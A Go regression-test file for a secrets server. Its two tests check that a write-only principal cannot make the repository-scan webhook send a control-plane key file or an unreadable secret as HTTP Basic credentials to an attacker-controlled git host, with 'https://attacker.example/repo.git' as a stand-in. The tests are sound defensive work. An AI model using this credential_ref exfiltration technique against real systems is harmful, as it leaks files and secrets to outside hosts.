// SPDX-License-Identifier: BUSL-1.1

package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"trstctl.com/trstctl/internal/config"
	"trstctl.com/trstctl/internal/crypto/secret"
	"trstctl.com/trstctl/internal/projections"
	"trstctl.com/trstctl/internal/secretscan"
	"trstctl.com/trstctl/internal/store"
)

func TestCR048RepositoryCredentialCannotReadFileOrUnownedSecret(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Fatalf("git is required for the served credential leak regression: %v", err)
	}
	work := t.TempDir()
	const fileCanary = "jsecrets-s05-canary-control-plane-file-0002\nsecond line survives base64\n" // #nosec G101 -- test canary (CWE-798)
	const secretCanary = "jsecrets-s05-canary-unrestricted-secret"                                  // #nosec G101 -- test canary (CWE-798)
	filePath := filepath.Join(t.TempDir(), "audit-signing.key")
	if err := os.WriteFile(filePath, []byte(fileCanary), 0o600); err != nil {
		t.Fatal(err)
	}
	var mu sync.Mutex
	var auths []string
	host := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		auths = append(auths, r.Header.Get("Authorization"))
		mu.Unlock()
		w.Header().Set("WWW-Authenticate", `Basic realm="attacker"`)
		http.Error(w, "authentication required", http.StatusUnauthorized)
	}))
	defer host.Close()
	ca := filepath.Join(work, "ca.pem")
	if err := os.WriteFile(ca, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: host.Certificate().Raw}), 0o600); err != nil {
		t.Fatal(err)
	}
	// Stand-in for a publicly trusted attacker certificate.
	t.Setenv("GIT_SSL_CAINFO", ca)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(work, "gitconfig"))

	fake := &fakeSecretRepoScanner{called: make(chan string, 4)}
	h := newOperatingServedHarness(t, config.Protocols{}, withSecretsEnabled(t, nil), func(d *Deps) { d.SecretScanner = fake })
	owner := seedScopedTokenSubject(t, h.store, h.tenant, "jsecrets-secret-owner", "secrets:read", "secrets:write")
	if status, body := secretsReqKey(t, h, http.MethodPost, "/api/v1/secrets/store", owner, "jsecrets-s05-seed", map[string]any{
		"name": "payments/deploy-token", "value": secretCanary,
	}); status != http.StatusCreated {
		t.Fatalf("seed victim secret: %d %s", status, body)
	}
	// secrets:write ONLY: may create secrets, may not read any.
	scanner := seedScopedTokenSubject(t, h.store, h.tenant, "jsecrets-scan-writer", "secrets:write")
	if status, body := secretsReq(t, h, http.MethodGet, "/api/v1/secrets/store/payments/deploy-token", scanner, nil); status != http.StatusForbidden {
		t.Fatalf("control: the scan writer's direct read = %d %s, want 403 (no secrets:read)", status, body)
	}

	runTerminal := func(runID string) (string, string) {
		t.Helper()
		deadline := time.After(repositoryScanWait)
		for {
			h.srv.dispatchOnce(context.Background())
			var status, message string
			if err := h.store.SystemPool().QueryRow(t.Context(),
				`SELECT status, error FROM discovery_runs WHERE tenant_id = $1 AND id = $2`, h.tenant, runID).Scan(&status, &message); err != nil {
				t.Fatal(err)
			}
			if status == "succeeded" || status == "failed" {
				return status, message
			}
			select {
			case <-deadline:
				t.Fatalf("run %s is still %s", runID, status)
			case <-time.After(50 * time.Millisecond):
			}
		}
	}
	decoded := func() []string {
		mu.Lock()
		defer mu.Unlock()
		var out []string
		for _, a := range auths {
			if raw, ok := strings.CutPrefix(a, "Basic "); ok {
				if b, err := base64.StdEncoding.DecodeString(raw); err == nil {
					out = append(out, string(b))
				}
			}
		}
		return out
	}
	leaked := map[string]bool{}
	for _, tc := range []struct{ name, repo, ref, canary string }{
		{"file", "attacker/file-exfil", "file:" + filePath, fileCanary},
		{"secret", "attacker/secret-exfil", "secret://payments/deploy-token", secretCanary},
	} {
		status, body := secretsReqKey(t, h, http.MethodPost, "/api/v1/secrets/scans/repositories/github/webhook", scanner, "jsecrets-s05-"+tc.name,
			map[string]any{"repository": tc.repo, "clone_url": host.URL + "/" + tc.repo + ".git", "credential_ref": tc.ref, "event": "push"})
		if status != http.StatusAccepted {
			t.Logf("%s: refused (fixed behavior): %d %s", tc.name, status, body)
			continue
		}
		t.Errorf("%s: a secrets:write principal without secrets:read queued a clone of its own https host with credential_ref %q: HTTP %d", tc.name, tc.ref, status)
		var receipt struct {
			RunID string `json:"run_id"`
		}
		if err := json.Unmarshal(body, &receipt); err != nil || receipt.RunID == "" {
			t.Fatalf("decode receipt: %v %s", err, body)
		}
		runStatus, message := runTerminal(receipt.RunID)
		t.Logf("%s: run %s ended %s (%s)", tc.name, receipt.RunID, runStatus, message)
		for _, pair := range decoded() {
			if strings.Contains(pair, tc.canary) {
				leaked[tc.name] = true
			}
		}
	}
	if leaked["file"] {
		t.Errorf("S-05 file: the tenant's git host received the full contents of a control-plane-owned file (multi-line, intact) as HTTP Basic credentials")
	}
	if leaked["secret"] {
		t.Errorf("S-05 secret://: the tenant's git host received the value of a secret the principal may not read")
	}
	if len(leaked) > 0 {
		t.FailNow()
	}
}

func TestCR048HistoricalRepositorySourceCannotOpenFileCredential(t *testing.T) {
	called := false
	d := &issuanceDispatcher{
		secretRepoScanner: &fakeSecretRepoScanner{},
		repoCredentials: func(context.Context, string, string) (*secret.Buffer, error) {
			called = true
			return nil, nil
		},
	}
	// #nosec G101 -- the fabricated file reference is a test selector, not secret material (CWE-798)
	cfg, err := json.Marshal(secretscan.RepositoryScanConfig{
		Provider: "github", Repository: "attacker/repo", CloneURL: "https://attacker.example/repo.git",
		CredentialRef: "file:/run/trstctl/platform-key",
	})
	if err != nil {
		t.Fatal(err)
	}
	_, status, reason, err := d.executeSecretRepositoryDiscoveryRun(t.Context(), "tenant", store.DiscoverySource{Config: cfg}, projections.DiscoveryRunQueued{})
	if err != nil || status != "failed" || !strings.Contains(reason, "predates read authorization") || called {
		t.Fatalf("historical source opened credential=%v, status=%q, reason=%q, err=%v", called, status, reason, err)
	}
}
